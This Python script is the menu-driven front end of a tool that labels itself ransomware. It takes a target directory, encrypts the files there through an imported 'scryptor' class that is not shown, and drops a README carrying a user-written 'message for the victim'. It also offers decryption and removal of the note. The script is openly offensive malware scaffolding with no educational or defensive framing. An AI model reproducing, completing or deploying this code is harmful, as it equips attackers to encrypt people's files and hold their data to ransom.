from app.scryptor import scryptor
import sys, time

try:
    sc = scryptor()

    sc.cleanTerm()

    time.sleep(1)

    while True:
        print('\n[*] RANSOMWARE [*]')

        time.sleep(1)

        print('\n[!] Ctrl + c to exit...')

        time.sleep(1)

        sc.path = input('\n[+] Enter the path of the files to damage or restore them: ')

        if sc.existPath():
            break

        else:
            print("\n[!] Path doesn't exist...")

            time.sleep(2)

            sc.cleanTerm()

    while True:
        sc.cleanTerm()

        time.sleep(1)

        print('\n[*] OPTIONS [*]')
        print('\n[1] Encrypt files')
        print('\n[2] Decrypt files')
        print('\n[3] Exit')

        op = int(input('\n[?] Choose your option: '))

        if op == 1:
            time.sleep(1)

            sc.cleanTerm()

            message = input('\n[+] Enter a message for the victim: ')

            print('\n[*] Encrypting files...')

            time.sleep(1)

            sc.encryptFiles()

            sc.addReadme(message)

            print('\n[+] Files encrypted successfully!')

            time.sleep(2)

            sc.cleanTerm()

        elif op == 2:
            time.sleep(1)

            sc.cleanTerm()

            print('\n[*] Decrypting files...')

            time.sleep(1)

            sc.decryptFiles()

            sc.removeReadme()

            print('\n[+] Files decrypted successfully!')

            time.sleep(2)

            sc.cleanTerm()

        elif op == 3:
            print('\n[!] Good bye...')

            time.sleep(1)

            sc.cleanTerm()

            break

        else:
            print('\n[!] Invalid input...')

            time.sleep(1)

            sc.cleanTerm()

except KeyboardInterrupt:
    print('\n\n[!] Canceling process...')

    time.sleep(1)

    ex = scryptor()

    ex.cleanTerm()

    sys.exit(0)
